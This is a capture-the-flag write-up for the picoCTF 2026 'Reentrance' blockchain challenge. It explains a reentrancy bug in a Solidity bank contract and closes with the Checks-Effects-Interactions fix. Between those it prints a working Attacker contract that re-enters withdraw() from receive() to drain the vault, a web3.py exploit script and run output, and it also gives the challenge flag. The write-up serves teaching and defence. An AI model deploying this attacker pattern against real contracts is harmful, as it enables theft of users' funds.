# PicoCTF 2026 — Reentrance (400 pts)

**Category:** Blockchain  
**Author:** OB  
**Flag:** `picoCTF{UpDaTe_St4ate5_1st_649d351f}`

---

## Challenge Description

> The lead developer at SecureBank Corp is back, and he's doubling down. After the last "incident," he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He's so confident, he's explicitly taunting the security team to try and break it. He says, "I've added the checks, I've added the balances. There is no way you can withdraw more than you own."
> 
> Your mission: Wipe the smile off his face. Drain the vault down to 0 and force the contract to surrender the flag.

**Instance Details:**

| Field          | Value                                        |
| -------------- | -------------------------------------------- |
| ETH Node       | `crystal-peak.picoctf.net:60760`             |
| Bank Address   | `0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF` |
| Vault Balance  | 10 ETH                                       |
| Player Address | `0xA3Dc447cdC7E494224dAd46731cE97832A75c9cd` |
| Player Balance | 5 ETH (for gas)                              |

---

## Vulnerability Analysis

The vulnerable contract `VulnBank.sol` was provided:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract VulnBank {
    mapping(address => uint) public balances;
    // ...

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient funds available");

        (bool sent, ) = msg.sender.call{value: amount}("");  // [1] Send ETH first
        balances[msg.sender] -= amount;                       // [2] Update balance AFTER
        require(sent, "Transfer failed");

        if (!revealed && address(this).balance == 0) {
            revealed = true;
            emit FlagRevealed(flag);                          // [3] Flag when drained
        }
    }
}
```

### The Bug: Reentrancy

The `withdraw()` function violates the **Checks-Effects-Interactions** pattern:

1. ✅ **Check** — `require(balances[msg.sender] >= amount)` — correct
2. ❌ **Interaction before Effect** — ETH is sent via `msg.sender.call{value: amount}("")` **before** `balances[msg.sender]` is decremented

When ETH is sent to a contract address, Solidity triggers that contract's `receive()` fallback function. Since the balance hasn't been updated yet at step [1], a malicious contract can call `withdraw()` again — and the `require` check still passes because `balances[attacker]` still shows the original amount.

This loop continues until the vault is empty.

```
Attack flow:
  attack(1 ETH) →
    vault.deposit(1 ETH)           # our recorded balance = 1 ETH, vault = 11 ETH
    vault.withdraw(1 ETH)
      → vault sends 1 ETH to us
          → receive() fires        # balance still = 1 ETH (not updated yet!)
              → vault.withdraw(1 ETH)
                  → vault sends 1 ETH
                      → receive() fires again...
                          (repeats 10× until vault = 0 ETH)
      → vault FINALLY sets balances[us] = 0   ← too late, already drained
```

---

## Exploit

### Attacker Contract (`Attacker.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getFlag() external view returns (string memory);
}

contract Attacker {
    IVault public vault;
    address payable public owner;
    uint256 public chunkSize;

    constructor(address _vault) public {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    /// @notice Deposit chunkSize ETH then trigger the reentrant drain
    function attack(uint256 _chunk) external payable {
        chunkSize = _chunk;
        vault.deposit{value: msg.value}();
        vault.withdraw(chunkSize);
    }

    /// @dev Fires every time vault sends ETH — re-enters before balance is updated
    receive() external payable {
        if (address(vault).balance >= chunkSize) {
            vault.withdraw(chunkSize);
        }
    }

    function collectFlag() external view returns (string memory) {
        return vault.getFlag();
    }

    function drain() external {
        require(msg.sender == owner, "not owner");
        owner.transfer(address(this).balance);
    }
}
```

### Exploit Script (`exploit.py`)

```python
from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version

NODE    = "http://crystal-peak.picoctf.net:60760"
PRIVKEY = "0x2f9e7168559db2e8f2eb3d7629c134a701c4b8a5adbb72df106fe2972d4afb78"
VAULT   = "0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF"

# 1. Connect
w3 = Web3(Web3.HTTPProvider(NODE))

# 2. Compile Attacker.sol with solc 0.6.12
install_solc("0.6.12"); set_solc_version("0.6.12")
compiled  = compile_source(ATTACKER_SOURCE, output_values=["abi","bin"], optimize=True)
bytecode  = compiled["<stdin>:Attacker"]["bin"]

# 3. Deploy Attacker contract
acct = w3.eth.account.from_key(PRIVKEY)
# ... deploy transaction ...

# 4. Call attack() with 1 ETH — reentrancy loop drains all 10 ETH
attacker.functions.attack(w3.to_wei(1,"ether")).build_transaction(...)
# value = 1 ETH, gas = 5_000_000

# 5. Read flag
flag = vault.functions.getFlag().call()
print(flag)
```

---

## Execution

```
✅  Node is up! (attempt 1)
    Block: #8
📊  Player : 0xA3Dc447cdC7E494224dAd46731cE97832A75c9cd
    Balance: 5.0000 ETH
    Vault  : 10.0000 ETH
📦  Compiling & deploying Attacker...
  ✅  Compiled (1365 bytes)
  deploy c872c53f...276137 ... ✅
    Attacker at 0xDBf28D9027F89ce4B61238385e940b0bDa9a8845
⚔️   Attacking (deposit 1 ETH → drain 10 ETH)...
  tx d0649a22...c89f00 ... ✅
🏦  Vault after attack: 0.000000 ETH
🎉  Drained!
🚩  FLAG: picoCTF{UpDaTe_St4ate5_1st_649d351f}
```

The single `attack()` transaction triggered the reentrancy loop **10 times**, draining the vault's 10 ETH plus reclaiming our deposited 1 ETH — total 11 ETH stolen in one transaction.

---

## The Fix: Checks-Effects-Interactions Pattern

```solidity
function withdraw(uint amount) public {
    // 1. CHECK
    require(balances[msg.sender] >= amount, "Insufficient funds");

    // 2. EFFECT — update state BEFORE any external call
    balances[msg.sender] -= amount;

    // 3. INTERACT — now safe to send ETH
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent, "Transfer failed");
}
```

By decrementing `balances[msg.sender]` **before** the `.call{}()`, any reentrant call will fail the `require` check because the balance is already 0.

Alternatively, OpenZeppelin's `ReentrancyGuard` modifier (`nonReentrant`) can be used as a defence-in-depth measure.

---

## Key Takeaways

| Concept       | Detail                                            |
| ------------- | ------------------------------------------------- |
| Vulnerability | Reentrancy — state updated after external call    |
| Root Cause    | Violation of Checks-Effects-Interactions pattern  |
| Impact        | Complete drainage of contract funds               |
| Fix           | Update `balances` before calling `.call{value}()` |
| Tooling       | `web3.py`, `py-solc-x`, solc 0.6.12               |

> The flag itself encodes the lesson: **`UpDaTe_St4ate5_1st`** — always update state first.


_Writeup by: obito | picoCTF 2026_